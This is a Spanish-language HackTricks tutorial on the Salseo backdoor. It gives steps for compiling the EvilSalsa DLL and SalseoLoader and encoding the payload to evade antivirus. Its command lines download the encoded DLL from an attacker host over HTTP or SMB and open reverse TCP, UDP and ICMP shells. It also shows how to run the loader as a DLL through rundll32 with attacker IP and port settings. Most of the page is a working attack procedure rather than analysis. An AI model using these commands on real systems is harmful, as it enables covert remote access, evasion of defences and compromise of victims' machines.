# Salseo

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compilando los binarios

Descarga el código fuente desde github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás **Visual Studio** instalado para compilar el código.

Compila esos proyectos para la arquitectura de la caja de Windows donde los vas a usar (si Windows soporta x64, compílalos para esas arquitecturas).

Puedes **seleccionar la arquitectura** dentro de Visual Studio en la pestaña **"Build"** a la izquierda en **"Platform Target".**

(**Si no encuentras estas opciones, presiona en la pestaña "Project"** y luego en **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Luego, construye ambos proyectos (Build -> Build Solution) (Dentro de los registros aparecerá la ruta del ejecutable):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Preparar el Backdoor

Primero que todo, necesitarás codificar el **EvilSalsa.dll.** Para hacerlo, puedes usar el script de python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader.**

**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**

## **Ejecuta la puerta trasera**

### **Obteniendo un shell TCP inverso (descargando la dll codificada a través de HTTP)**

Recuerda iniciar un nc como el oyente del shell inverso y un servidor HTTP para servir el evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obteniendo una reverse shell UDP (descargando dll codificada a través de SMB)**

Recuerda iniciar un nc como el oyente de la reverse shell, y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obteniendo una shell inversa ICMP (dll codificada ya dentro de la víctima)**

**Esta vez necesitas una herramienta especial en el cliente para recibir la shell inversa. Descarga:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desactivar Respuestas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Ejecutar el cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro de la víctima, ejecutemos la cosa del salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando la función principal

Abre el proyecto SalseoLoader usando Visual Studio.

### Añade antes de la función principal: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instala DllExport para este proyecto

#### **Herramientas** --> **Administrador de Paquetes NuGet** --> **Administrar Paquetes NuGet para la Solución...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Busca el paquete DllExport (usando la pestaña Examinar), y presiona Instalar (y acepta el popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png>)

En la carpeta de tu proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**

### **Desinstala** DllExport

Presiona **Desinstalar** (sí, es raro pero confía en mí, es necesario)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Sal de Visual Studio y ejecuta DllExport\_configure**

Simplemente **sal** de Visual Studio

Luego, ve a tu **carpeta SalseoLoader** y **ejecuta DllExport\_Configure.bat**

Selecciona **x64** (si vas a usarlo dentro de una caja x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Espacio de nombres para DllExport**) y presiona **Aplicar**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Abre el proyecto de nuevo con Visual Studio**

**\[DllExport]** ya no debería estar marcado como error

![](<../.gitbook/assets/image (8) (1).png>)

### Construye la solución

Selecciona **Tipo de Salida = Biblioteca de Clases** (Proyecto --> Propiedades de SalseoLoader --> Aplicación --> Tipo de salida = Biblioteca de Clases)

![](<../.gitbook/assets/image (10) (1).png>)

Selecciona la **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilación --> Objetivo de la plataforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Para **construir** la solución: Construir --> Construir Solución (Dentro de la consola de Salida aparecerá la ruta de la nueva DLL)

### Prueba la Dll generada

Copia y pega la Dll donde quieras probarla.

Ejecuta:
```
rundll32.exe SalseoLoader.dll,main
```
Si no aparece ningún error, ¡probablemente tienes una DLL funcional!

## Obtener una shell usando la DLL

No olvides usar un **servidor HTTP** y configurar un **listener nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
